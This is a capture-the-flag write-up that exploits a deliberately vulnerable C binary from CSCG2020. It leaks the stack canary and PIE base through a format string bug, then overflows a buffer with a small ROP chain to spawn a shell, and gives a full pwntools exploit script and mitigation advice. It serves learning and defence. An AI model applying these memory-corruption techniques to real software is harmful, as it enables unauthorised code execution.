# CSCG2020 - Introduction to Pwning 2 WriteUp
Author: @Tibotix

[TOC]

The Introduction to Pwning 2 is a Pwning challenge with difficulty "Baby".

As in the Introduction to Pwning 1 challenge, the goal of this challenge is also to read the flag file which is stored on the server that runs the program we interact with. So we somehow need to exploit the program to give us a shell. 

In this WriteUp we make use of a **Format String Vulnerability** to leak the stack canary and base address of text segment and a **Buffer Overflow Vulnerability** to overwrite return address and thus redirect code execution.

But first lets do a little bit of research.



## Research

Lets take a quick look at `checksec` to see the enabled security measures:

![alt_text](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/checksec_output.png?raw=true "checksec output")

This time all measures are enabled including the stack canary.

Now lets have a look at the source code, which is also provided.
At the top of the file, helper functions, which can be ignored, are declared:

```C++
#include <string.h>

#ifndef PASSWORD
    #define PASSWORD "CSCG{FLAG_FROM_STAGE_1}"
#endif

// pwn2: gcc pwn2.c -o pwn2

// --------------------------------------------------- SETUP

void ignore_me_init_buffering() {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void kill_on_timeout(int sig) {
  if (sig == SIGALRM) {
  	printf("[!] Anti DoS Signal. Patch me out for testing.");
    //_exit(0);
  }
}

void ignore_me_init_signal() {
	signal(SIGALRM, kill_on_timeout);
	alarm(60);
}

// just a safe alternative to gets()
size_t read_input(int fd, char *buf, size_t size) {
  size_t i;
  for (i = 0; i < size-1; ++i) {
    char c;
    if (read(fd, &c, 1) <= 0) {
      _exit(0);
    }
    if (c == '\n') {
      break;
    }
    buf[i] = c;
  }
  buf[i] = '\0';
  return i;
}
```

Then the main logic of the pwn2 program is implemented:

```C++
// --------------------------------------------------- MENU

void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}

void check_password_stage1() {
    char read_buf[0xff];
    printf("Enter the password of stage 1:\n");
    memset(read_buf, 0, sizeof(read_buf));
    read_input(0, read_buf, sizeof(read_buf));
    if(strcmp(read_buf, PASSWORD) != 0) {
        printf("-10 Points for Ravenclaw!\n");
        _exit(0);
    } else {
        printf("+10 Points for Ravenclaw!\n");
    }
}

void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Ravenclaw!  │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}


void AAAAAAAA() {
    char read_buf[0xff];
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Ravenclaw!\n");
        _exit(0);
    }
}
// --------------------------------------------------- MAIN

void main(int argc, char* argv[]) {
	  ignore_me_init_buffering();
	  ignore_me_init_signal();

    check_password_stage1();

    welcome();
    AAAAAAAA();
}
```



As we can see the `main` function first checks the password of stage 1 so you first have to solve  *Introduction to Pwning 1* in order to solve this challenge. 

Then `main` calls `welcome` and last `AAAAAAAA` . You also should have noticed the `WINgardium_leviosa` function, which obviously looks kinda like the "Goal Function" cause this function spawns  a shell for us.

**So our main goal is to redirect program execution to the `WINgardium_leviosa`  function in order to gain a shell and read the "flag" file on the server**

On the whole this challenge looks very similar to the previous *Introduction to Pwning 1* challenge, except that this time the stack canary prevention is enabled which makes overwriting the return address a bit more complicated.

But only a little bit :-)
Lets move forwards.



## Exploitation

### Format String exploit

So as well as in the *Introduction to Pwning 1* challenge we can detect a **Format String vulnerability**  in the `welcome` function:

````C++
char read_buf[0xff];
gets(read_buf);
printf(read_buf);
````

A Format String vulnerability occurs when user controlled data is passed without validation or usage of *format specifiers* to a *format function* such as `printf` . *Format specifiers* are placeholders in a string that are replaced with it's associated argument.

A short example:

```C++
char name[8]{"Tibotix"};
int age{16};
printf("Hello, %s. You are %d years old", name, age);
// printf Will print:
// Hello, Tibotix. You are 16 years old
```

There are many types of *format specifiers* such as `%s` , which expects a string, or `%d` ,  which expects an integer. So does `%p` for example expects a pointer of the type `void *` .
When the user-controlled data is now passed into a *format function* such as `printf` without the usage of these *format specifiers* , the *format function* will look for arguments to replace with, but cause we do not have provided anyone, it will find whatever on the registers or rather on the stack is and will treat these as the arguments and thus print these:



![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/format_string_output_test.png?raw=true)

**Note that instead of writing 39 times `%p ` we can use the direct access formatter `%39$p`.**



So here we have our **Memory Leak** .

You can read more about Format String vulnerabilities at [OWASP](https://owasp.org/www-community/attacks/Format_string_attack) and [WIKIPEDIA](https://en.wikipedia.org/wiki/Uncontrolled_format_string) .

### Process In-Memory segments and randomization

So now lets talk a little bit about processes and understand why we need this Memory Leak.

Each running process has 6 different so called `segments` in memory. These are:

- `Text` Segment , for executable instructions
- `Data` Segment, for initialized static and global variables
- `BSS` Segment, for uninitialized static and global variables
- `Heap` Segment, for memory which can be allocated by the program
- `Memory Mapping` Segment, for file mappings such as `libc.so` , `libstdc++`, `ld-linux.so` 
- `Stack` Segment, for stackframes (local variables, function parameter, ... )

Due to [Virtual Memory](https://en.wikipedia.org/wiki/Virtual_memory) every process theoretically could use the whole address range of RAM (practical it's slightly less, but however). Cause one process most likely will not need this big amount of address space, the segments only use a part of the virtual memory. So each segment have its own *base address* where it starts in virtual memory.

When a binary is executed, the OS will set up a new process context including the *virtual address space* and load the requested *interpreter* in the `memory mapping` segment. The *interpreter* is a shared object and know how to load the binary. It's is specified in the `.interp` *section* of the [ELF](http://man7.org/linux/man-pages/man5/elf.5.html) binary and is typically the `ld-linux.so` shared object .
Next, the OS transfers control to this *interpreter* , which will load the other segments and perform relocations. At the end it jumps to the entry point in the `code` segment and the code of the executed binary begins.

Ok, so far so good. 

Now there are a few security measures that makes things a bit more complicated. One of these is [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (Address Space Layout Randomization). ASLR randomizes where in this huge *virtual address space* the single segments are placed. It does so by changing  every time the binary is executed the *base address* of segments affected by ASLR.

**`Stack`, `Heap` and `Memory Mapping` segments are always affected by ASLR . **
**Their base addresses are randomized individually .**
This means that the distance between these segments are **not always the same** as they are placed individually.

It should be noted that in order to randomize the `text `, `data` and `bss` segments the binary have to be compiled as a [PIE](https://en.wikipedia.org/wiki/Position-independent_code) (Position Independent Executable). A PIE does not have any hard coded absolute addresses in instructions and refers local functions and data only by offsets. This allows ASLR to randomize these segments too. Shared objects and libraries are always PIE's as they are used and loaded by many processes at different addresses. 

**`Text`, `Data` and `BSS` segments are only affected by ASLR if the binary is compiled as a PIE. 
Their base addresses are randomized always in the same relationship to each other.**
This means that the distance between these segments are **always the same** as they are placed continuously in relation to each other.

This was a quick ex-course to how processes looks like in memory and how ASLR works.
I hope you could follow me and now have a basic knowledge when we look further.

### Base Address Leak

So lets go back to the previous question: "Why we need a Memory Leak ? ".

As we already identified the program is compiled as a PIE meaning the `Text` , `Data` and `BSS` segments are also randomized by ASLR. Cause we need to know the virtual address of the `WINgardium_leviosa` function in order to jump to it, we somehow need to **dynamically leak the base address of the `Text` segment** and from there we can add a **fixed offset** to locate the `WINgardium_leviosa` function: 

```python
WINgardium_leviosa_location = text_segment_base_address + offset
```

The offset should be easy to retrieve by using objdump:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/WINgardium_leviosa_offset.png?raw=true "WINgardium_leviosa_offset")

The updated formula now looks like this:

```python
WINgardium_leviosa_location = text_segment_base_address + 0xb94
```

But how we get the *base address* of the `Text` segment ?


First, lets have a look at the stack when the `welcome` function returns. I have added a breakpoint at the `leave` instruction: 

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/breakpoint_welcome.png?raw=true "breakpoint_welcome")

Now, lets continue and see what the stack looks like when we hit the breakpoint:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/basic_stack_look_return_address_canary.png?raw=true "basic_stack_look_return_address_canary")

Okay, here you can see two things. First, 8 bytes over the were the rbp register points , we can see the *Stack Canary*. In this case it is `0xe6ff40521d60bb00`.

From [Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries):

> *Canaries* or *canary words* are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data. 

Second, 8 bytes after where rbp register points , we can clearly identify the return address which is `0x55a57d057dc5` . Cause return addresses always points to assembler instructions, which are stored in the `Text` segment,  we can assume that `0x55a57d057dc5` is part of the `Text` segment. With this knowledge we can calculate the *base address* by subtracting the offset to the return address:

```python
text_segment_base_address = return_address - 0xdc5
WINgardium_leviosa_location = text_segment_base_address + 0xb94
```

So, our next goal is to leak the return address on the stack.

And this is were the Format String Vulnerability comes into play. We only need to know which argument meaning which `%p` gives us the return address.
So lets look at the stack above and we can see that the first argument for the `printf` function is stored on the stack and begins at `0x7ffddf5aa840` . We also can see the location of the return address at `0x7ffddf5aa958`. 

The distance between these is:

```python
>>> 0x7ffddf5aa958-0x7ffddf5aa840
280
```

Due to the 64-bit calling conventions, which follows

1. Argument : RDI
2. Argument: RSI
3. Argument: RDX
4. Argument: RCX
5. Argument R8
6. Argument: R9
7. and all other Arguments: pushed on stack

the first 6 Arguments are stored in registers and then all others are stored on the stack each as an 8-byte value of course. 
So we have `280 / 8 = 35` possible arguments on the stack before the return address begins.
Cause arguments 2 - 6 are stored in registers we add `5` and get `35 + 5 = 40` . Now we know that the **41.** argument is the return address. From there we can easily calculate the stack canary argument number by subtracting two, as the stack canary is stored 16-bytes below the return address: `41 - 2 = 39` . So the **39.** argument is the stack canary.

Lets put this knowledge all together in a python3 script.

```python
from pwn import *
import struct

stage_1_flag = "CSCG{THIS_IS_TEST_FLAG}"

p = remote('127.0.0.1', 1024)

print(p.recvline()) # Enter the password of stage 1:

p.sendline(stage_1_flag)

print(p.recvline()) # +10 Points for Ravenclaw!
print(p.recvline()) # Enter your witch name:

input('attach gdb')

stack_canary_leak = b'%39$p'
return_address_leak = b'%41$p'
p.sendline(stack_canary_leak+b' '+return_address_leak)

print(p.recvline().decode('utf-8')) # ┌───────────────────────┐
print(p.recvline().decode('utf-8')) # │ You are a Ravenclaw!  │
print(p.recvline().decode('utf-8')) # └───────────────────────┘


memory_leak = p.recvline().split(b' ') # ['0x??????????????', '0x????????????????', enter, your, magic, spell:]
stack_canary_int = int(memory_leak[0], 16)
return_address_int = int(memory_leak[1], 16)
base_address = return_address_int - 0xdc5

print('stack_canary: {0}'.format(hex(stack_canary_int)))
print('base_address: {0}'.format(hex(base_address)))

WINgardium_leviosa_location = text_segment_base_address + 0xb94
```

I have added an input so i had enough time to attach gdb in another shell.

So lets run it, attach gdb, and see what we get:

First lets check the base address:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/memory_leak_test_base_address.png?raw=true)

Now the stack:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/memory_leak_test_stack.png?raw=true)

Here you can see the stack canary value, which is `0x40d1ecaf2d83f00`. 

When we look at the output of our program we can see it correctly calculated the base address and stack canary:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/memory_leak_test_output.png?raw=true)

Wonderful! 

Now we have the *stack canary* , *base address*, and thus the `WINgardium_leviosa` function address.
Lets move on and use this to exploit the program.



### Buffer Overflow exploit

Since our main goal is to redirect code execution to the `WINgardium_leviosa` function, one way to achieve this is to overwrite the return address of the `AAAAAAAA` function.
But we have to pay attention to the *stack canary*, which is checked when returning from `AAAAAAAA`.  If it is overwritten, we got a `stack smashing detected` message and the program will immediately stop execution. Cause we leaked the current *stack canary*, we only have to overwrite it with itself.

The distance of the beginning of the `read_buf` variable to the stack canary is `264` bytes long so we have to fill the first `264` bytes with padding, the overwrite the *stack canary* with itself, then some padding for the rbp pointer, and last the `WINgardium_leviosa` function address as the new return address:

```python
shell_payload = b'A'*264 + stack_canary_value + b'B'*8 + WINgardium_leviosa_address
```

But one thing we forgot. The `welcome` function checks our input if it has the sequence `"Expelliarmus"` :

```c++
if(strcmp(read_buf, "Expelliarmus") == 0) {
    printf("~ Protego!\n");
} else {
    printf("-10 Points for Ravenclaw!\n");
    _exit(0);
}
```

If the variable `read_buf` has not the value `"Expelliarmus"`, the program will immediately exit and never returns and thus never jump to the `WINgardium_leviosa` function.

So as in the previous Challenge *Intro to Pwning 1* , the trick is to place a **NULL-Byte string terminator** after `"Expelliarmus"`. This will trick the `strcmp` function into thinking the string is terminated after the `"Expelliarmus"`. 
The `"gets"` function by the way terminates the string only at a *Newline Character* `\n`. This is why we still can write the rest of our payload after the NULL-Byte.

So our new payload will look like this:

```python
shell_payload = b"Expelliarmus\x00" + b'A'*251 + stack_canary_value + b'B'*8 + WINgardium_leviosa_address
```

Now lets try it out!

We ran our exploit, attached gdb and look at the stack when we hit the `leave` instruction in both functions `welcome` and `AAAAAAAA` :

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/redirection_demo_stack_before_overflow.png?raw=true)

Here we can see everything looks normal, now continuing:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/redirection_demo_stack_after_overflow.png?raw=true)

Ahh, now the return address magically changed to `WINgardium_leviosa` ! 

Ok nice! But when we continuing , the program crashes:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/do_system_crash.png?raw=true)

This is a bit strange cause we **successfully redirected code execution** to the `WINgardium_leviosa` function, but inside the `system("/bin/sh");` function call the program crashes..

Lets look at the instruction that causes the problem:

```Assembler
movaps xmmword ptr [rsp + 0x50], xmm0
```

From [MOVAPS Description](https://www.felixcloutier.com/x86/movaps "MOVAPS Description"):

>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version) boundary or a 
>general-protection exception (#GP) will be generated.

So the destination operand is `[rsp + 0x50]`, rsp is `0x7ffddf5aa5b8` and is obviously not 16-byte aligned.

Now how we can change `rsp`?

There are multiple instructions that do this:

- `push` instruction
- `pop` instruction
- `call` instruction
- `ret` instruction
- `sub` rsp, 0x02
- `add` rsp, 0x08

Lets use a tiny rop chain to reduce `rsp` by using one other `ret` instruction.
For the first `ret` we simply use the `ret` from `AAAAAAAA` itself, so we basically jumping on point but reducing the stack.
The offset of this `ret` can simply be obtained by disassembling the `AAAAAAAA` function and is `0xd8d`. 

Now lets put this all together in our final script:

```python
from pwn import *
import struct

stage_1_flag = "CSCG{THIS_IS_TEST_FLAG}"

p = remote('127.0.0.1', 1024)

print(p.recvline()) # Enter the password of stage 1:

p.sendline(stage_1_flag)

print(p.recvline()) # +10 Points for Ravenclaw!
print(p.recvline()) # Enter your witch name:

input('attach gdb')

stack_canary_leak = b'%39$p'
return_address_leak = b'%41$p'
p.sendline(stack_canary_leak+b' '+return_address_leak)

print(p.recvline().decode('utf-8')) # ┌───────────────────────┐
print(p.recvline().decode('utf-8')) # │ You are a Ravenclaw!  │
print(p.recvline().decode('utf-8')) # └───────────────────────┘


memory_leak = p.recvline().split(b' ') # ['0x??????????????', '0x????????????????', enter, your, magic, spell:]
stack_canary_int = int(memory_leak[0], 16)
return_address_int = int(memory_leak[1], 16)
base_address = return_address_int - 0xdc5

print('stack_canary: {0}'.format(hex(stack_canary_int)))
print('base_address: {0}'.format(hex(base_address)))

WINgardium_leviosa_address = struct.pack('Q', text_segment_base_address + 0xb94)
stack_canary_value = struct.pack('Q', stack_canary_int)
AAAAAAAA_ret_location = struct.pack('Q', text_segment_base_address + 0xd8d)

shell_payload = b"Expelliarmus\x00" + b'A'*251 + stack_canary_value + b'B'*8 + AAAAAAAA_ret_location + WINgardium_leviosa_address


p.sendline(shell_payload)
p.interactive()
```

We use `struct` to pack a decimal number in binary format so we can send it to the server.

Lets try out our exploit again. When we now hit the `leave` instruction in the `AAAAAAAA` function we can clearly see our crafted rop-chain:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/rop_chain_stack.png?raw=true)

and our exploit works as well as expected:

![](https://github.com/chikizikikato/CTFWriteUps/blob/master/CSCG2020/pwn2/successfull_exploit.png?raw=true)

Now you only have to change the server and port address and you are good to go.

```python
p = remote('hax1.allesctf.net', 9101)
...
...
...
```



## Prevention

This section covers a few prevention measures for the above discussed security issues.

### Format String Protection

Basically the best thing you can do to mitigate Format String exploits are the correct usage of `printf` **with formatters**:

```C++
printf("Hello, %s", name);
```

the compiler can help you find wrong usage of print-functions by turning on flags for example the `-Wformat` flag.

Also you always have to validate user-controlled input as this is generally a good idea and helps the prevention of Format String attacks, too.

Cause of the arbitrary read/write possibilities in Format String exploits you really should avoid these. Buffer Overlow exploits such as one in this challenge would be much more difficult to exploit without the Format String exploit to leak the base address and thus bypassing ASLR.

### Buffer Overflow Protection

To prevent Buffer Overflow attacks such as one just discussed, a good idea is to turn on all security protections especially the stack-cookie protector and ASLR, cause then the overwrite from rbp and return address is much more difficult.

Also its generally a good idea to compile every program as a PIE so the kernel can map it to random address and thus helps to mitigate a code redirection without any memory leak. So if you compile a binary without PIE enabled, you should have a really good reason.

As in this challenge introduced, the *stack canary* is also a good measure to detect and mitigate all stack based buffer overflows.

Another and obviously the best approach is to use safe "buffer-reading" functions such as `fgets` that checks the boundary of the input buffer.
On C++, also only use the `strn-` versions as they provide a boundary check.

## Conclusion

This Challenge was really fun to me and a good connection to the first *Introduction to Pwning 1* challenge. Through a **Format String Vulnerability** we leaked the stack canary and the base address of the text segment in order to silently overwrite the return address through a **Buffer Overflow Vulnerability** and to calculate the address of the `WINgardium_leviosa`  function which spawns a shell for us. 
As you probably already noticed this WriteUp is very very detailed, and thats cause i do it mainly for myself to learn and understand the used techniques better.
I hope you nevertheless enjoyed it and maybe also learned a bit :-).